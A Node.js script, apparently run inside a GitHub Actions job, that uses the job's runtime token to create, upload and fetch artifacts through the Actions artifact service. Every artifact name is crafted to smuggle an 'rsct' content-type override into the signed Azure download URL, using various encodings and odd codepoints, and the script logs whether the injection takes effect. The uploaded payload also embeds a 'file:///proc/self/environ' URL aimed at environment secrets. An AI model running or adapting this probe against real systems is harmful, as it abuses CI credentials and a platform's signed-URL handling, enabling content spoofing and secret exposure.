'use strict';

const crypto = require('node:crypto');
const https = require('node:https');

const SERVICE = '/twirp/github.actions.results.api.v1.ArtifactService/';

function context() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
  const scope = payload.scp.split(' ').find((value) => value.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  return { token, base, runId, jobId };
}

async function rpc(ctx, method, fields) {
  const response = await fetch(ctx.base + SERVICE + method, {
    method: 'POST',
    headers: { Authorization: `Bearer ${ctx.token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ workflow_run_backend_id: ctx.runId,
      workflow_job_run_backend_id: ctx.jobId, ...fields }),
    signal: AbortSignal.timeout(20000),
  });
  const text = await response.text();
  let body = {};
  try { body = JSON.parse(text); } catch { body = { raw: text.slice(0, 240) }; }
  return { status: response.status, body };
}

function field(result, name) {
  return result.body[name] || result.body[name.replace(/_([a-z])/g, (_, c) => c.toUpperCase())] || null;
}

function rawGet(url) {
  return new Promise((resolve) => {
    const request = https.get(url, { agent: false, timeout: 20000 }, (response) => {
      const chunks = [];
      response.on('data', (chunk) => chunks.push(chunk));
      response.on('end', () => resolve({
        status: response.statusCode,
        contentTypeHex: Buffer.from(String(response.headers['content-type'] || ''), 'latin1').toString('hex'),
        contentDispositionHex: Buffer.from(String(response.headers['content-disposition'] || ''), 'latin1').toString('hex'),
        bodySha: crypto.createHash('sha256').update(Buffer.concat(chunks)).digest('hex'),
      }));
    });
    request.on('timeout', () => request.destroy(new Error('timeout')));
    request.on('error', (error) => resolve({ error: `${error.code || error.name}:${error.message}` }));
  });
}

(async () => {
  const ctx = context();
  const stamp = Date.now();
  const names = [
    ['amp-raw', `q-${stamp}&rsct=%C2%85application%2Fjson.json`],
    ['amp-encoded', `q-${stamp}%26rsct%3D%C2%85application%2Fjson.json`],
    ['hash-raw', `q-${stamp}#&rsct=%C2%85application%2Fjson.json`],
    ['semi-raw', `q-${stamp};rsct=%C2%85application%2Fjson.json`],
    ['amp-u0085', `q-${stamp}&rsct=\u0085application-json.json`],
    ['amp-u0185', `q-${stamp}&rsct=\u0185application-json.json`],
    ['lowbyte-amp', `q-${stamp}\u0126rsct=%C2%85application-json.json`],
    ['double-percent', `q-${stamp}%2526rsct%253D%25C2%2585application%252Fjson.json`],
    ['question-encoded', `q-${stamp}%3Frsct%3D%C2%85application%2Fjson.json`],
  ];
  for (let index = 0; index < names.length; index += 1) {
    const [label, name] = names[index];
    const payload = Buffer.from(JSON.stringify({ full_name: 'query/name',
      owner: { login: 'query', avatar_url: 'file:///proc/self/environ' }, label }));
    const created = await rpc(ctx, 'CreateArtifact', { name, version: 7,
      mime_type: 'application/json' });
    const uploadUrl = field(created, 'signed_upload_url');
    const output = { label, nameCodepoints: Array.from(name,
      (c) => c.codePointAt(0).toString(16)).join(','), create: created.status,
      accepted: Boolean(uploadUrl), message: created.body.msg || created.body.message || '' };
    if (uploadUrl) {
      const uploaded = await fetch(uploadUrl, { method: 'PUT', headers: {
        'Content-Type': 'application/json', 'x-ms-blob-type': 'BlockBlob' },
      body: payload, signal: AbortSignal.timeout(20000) });
      const finalized = await rpc(ctx, 'FinalizeArtifact', { name,
        size: String(payload.length),
        hash: `sha256:${crypto.createHash('sha256').update(payload).digest('hex')}` });
      const signed = await rpc(ctx, 'GetSignedArtifactURL', { name });
      const downloadUrl = field(signed, 'signed_url');
      output.upload = uploaded.status;
      output.finalize = finalized.status;
      output.artifactId = field(finalized, 'artifact_id');
      output.signed = signed.status;
      if (downloadUrl) {
        const parsed = new URL(downloadUrl);
        output.queryKeys = Array.from(parsed.searchParams.keys());
        output.rsctValues = parsed.searchParams.getAll('rsct').map((value) =>
          Array.from(value, (c) => c.codePointAt(0).toString(16)).join(','));
        output.rscd = parsed.searchParams.get('rscd');
        output.get = await rawGet(downloadUrl);
      }
    }
    console.log('QNAME ' + JSON.stringify(output));
  }
})().catch((error) => {
  console.error(error && error.stack || error);
  process.exitCode = 1;
});
